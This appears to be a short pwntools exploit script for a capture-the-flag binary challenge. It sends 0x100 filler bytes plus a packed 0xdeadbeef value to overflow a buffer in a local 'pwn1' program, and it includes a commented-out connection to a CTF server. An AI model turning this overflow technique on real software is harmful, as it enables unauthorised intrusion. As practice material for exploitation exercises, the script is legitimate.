from pwn import *

context.log_level = 'debug'

r = process("./pwn1",env={'LD_PRELOAD':'./libc.so.6'})
#r = remote('ctf.kuality.kr',12350)
#gdb.attach(r,"b* 0x00000000004007cf")
payload = 'A'*0x100
payload += p64(0xdeadbeef)

r.sendlineafter("> ",payload)

r.interactive()
